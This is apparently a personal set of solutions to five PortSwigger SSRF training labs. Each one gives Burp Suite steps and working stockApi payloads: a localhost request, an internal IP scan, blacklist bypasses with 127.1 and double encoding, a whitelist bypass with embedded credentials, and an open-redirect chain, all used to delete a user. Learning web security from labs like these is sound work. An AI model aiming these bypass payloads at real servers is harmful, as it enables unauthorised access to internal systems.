## SSRF vulnerabilities

### [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

Goal: change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

- Go to any product `/product?productId=1`
- click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
- Change the URL in the `stockApi` parameter to `http://localhost/admin`. This should display the administration interface.

<img src=".\ssrf_img\1_1.png" style="zoom:70%;" />



- notice that you can delete `carlos` by sending `GET` to `/admin/delete?username=carlos`
- Submit this URL in the `stockApi` parameter

<img src=".\ssrf_img\1_2.png" style="zoom:70%;" />







---



### [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

Goal : use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.

- Go to any product `/product?productId=1`
- click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
- you have to find the internal ip of the admin panel . so , send the request `POST /product/stock` to burp intruder 
- Click "Clear §", change the `stockApi` parameter to `http://192.168.0.1:8080/admin` then highlight the final octet of the IP address (the number `1`), click "Add §".
- Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
- Click "Start attack". You should see a single entry with a status of 200, showing an admin interface.

<img src=".\ssrf_img\2_1.png" style="zoom:80%;" />



- now you have the ip , send the request with  `/admin/delete?username=carlos` in `stockApi` parameter to delete `carlos`

<img src=".\ssrf_img\2_2.png" style="zoom:80%;" />





---



### [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

Goal : change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

- Go to any product `/product?productId=1`

- click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.

- I tried a lot of [bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) like:

  - 127.0.0.1
  - localhost
  - 2130706433 (Decimal ip for 127.0.0.1) [Long / Decimal IP](https://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx)
  - http://spoofed.burpcollaborator.net => 127.0.0.1

  but all of them got blocked `"External stock check blocked for security reasons"`

- finally i could bypass it with 127.1 and [double encoding](https://owasp.org/www-community/Double_Encoding) of `admin`
  ```bash
  stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
  ```

  



<img src="C:\Users\dell\Desktop\ssrf_img\3_1.png" style="zoom:80%;" />





- send the request with  `/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos` in `stockApi` parameter to delete `carlos`

  

<img src="C:\Users\dell\Desktop\ssrf_img\3_2.png" style="zoom:80%;" />







---





### [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

Goal: change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`

- Go to any product `/product?productId=1`
- click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
- Change the URL to `http://username@stock.weliketoshop.net/` and observe that this is accepted, indicating that the URL parser supports embedded credentials.
- Append a `#` to the username and observe that the URL is now rejected.
- bypass the block with Double-URL encode the `#` to `%2523` and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
- change `username` to `localhost` and add `/admin`

<img src=".\ssrf_img\4_1.png" style="zoom:60%;" />



- delete `carlos`
  ````bash
  stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
  
  // everything after http:// is the domain 
  // %2523 is the double URL encoding of # to make any thing after it just an id (element)
  // stock.weliketoshop.net mandatory to bypass the whitelist filter
  // /admin/delete?username=carlos path that we want to visit
  ````

  





----





### [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

Goal : change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

1. Go to any product `/product?productId=1`
2. click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
3. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
4. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
5. <img src=".\ssrf_img\5_1.png" style="zoom:90%;" />



1. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:

   ```bash
   stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
   
   // $26 is the URL encoding of &
   ```

2. Observe that the stock checker follows the redirection and shows you the admin page.

<img src=".\ssrf_img\5_2.png" style="zoom:80%;" />



- Append the path to delete the target user:

```bash
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```



---





